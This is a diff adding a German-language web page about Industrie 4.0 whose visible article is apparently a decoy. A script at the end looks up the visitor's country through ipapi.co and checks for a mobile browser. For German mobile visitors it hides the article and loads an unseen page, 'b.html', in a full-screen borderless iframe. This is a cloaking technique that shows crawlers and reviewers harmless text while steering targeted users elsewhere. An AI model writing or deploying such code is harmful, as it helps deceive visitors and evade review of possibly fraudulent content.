@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Industrie 4.0 und Technologische Innovation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            background: #007BFF;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+        }
+        main {
+            padding: 20px;
+            background: white;
+            max-width: 800px;
+            margin: 20px auto;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            font-size: 24px;
+        }
+        h2 {
+            font-size: 20px;
+            margin-top: 20px;
+        }
+        p {
+            line-height: 1.6;
+        }
+        footer {
+            text-align: center;
+            padding: 10px;
+            background: #007BFF;
+            color: white;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+        }
+        .content {
+            display: block;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="content" class="content">
+        <header>
+            <h1>Industrie 4.0 und Technologische Innovation</h1>
+        </header>
+        <main>
+            <h2>Starke Fertigungs- und Ingenieurkompetenz</h2>
+            <p>Die deutsche Wirtschaft ist bekannt für ihre starke Fertigungs- und Ingenieurkompetenz, insbesondere in den Bereichen Automobile, Maschinenbau und Elektrotechnik.</p>
+            
+            <h2>Digitale Transformation</h2>
+            <p>In den letzten Jahren hat Deutschland aktiv die Umsetzung von Industrie 4.0 vorangetrieben, um durch Digitalisierung und Intelligenz die Produktionseffizienz zu steigern.</p>
+            
+            <h2>Einsatz von IoT und KI</h2>
+            <p>Unternehmen setzen das Internet der Dinge, Künstliche Intelligenz und Big Data-Analysen ein, um die Lieferkette zu optimieren und die Produktqualität zu verbessern.</p>
+            
+            <h2>Regierungsunterstützung für Innovation</h2>
+            <p>Die Regierung fördert Innovation und Forschung durch finanzielle Unterstützung und politische Anreize.</p>
+            
+            <h2>Führende Position im globalen Wettbewerb</h2>
+            <p>Diese strategische Ausrichtung auf technologische Innovation ermöglicht es Deutschland, seine führende Position im globalen Wettbewerb zu behaupten und sein Image als "Fertigungsland" weiter zu festigen.</p>
+        </main>
+        <footer>
+            <p>&copy; 2025 Industrie 4.0 und Technologische Innovation</p>
+        </footer>
+    </div>
+
+    <script>
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        function isGermanLanguage() {
+            const language = navigator.language || navigator.userLanguage;
+            return language.startsWith('de');
+        }
+
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => { 
+                if (data.country === 'DE' && isMobileDevice()) {
+                    document.getElementById('content').classList.add('hidden');
+                    var iframe = document.createElement('iframe');
+                    iframe.src = 'b.html';
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100vh';
+                    iframe.style.border = 'none';
+                    document.body.appendChild(iframe);
+                    return;
+                }
+            })
+            .catch(error => {
+                console.error('Error fetching IP data:', error);
+                if (isGermanLanguage() && isMobileDevice()) {
+                    document.getElementById('content').classList.add('hidden');
+                    var iframe = document.createElement('iframe');
+                    iframe.src = 'b.html';
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100vh';
+                    iframe.style.border = 'none';
+                    document.body.appendChild(iframe);
+                    return;
+                }
+            });
+    </script>
+</body>
+</html>
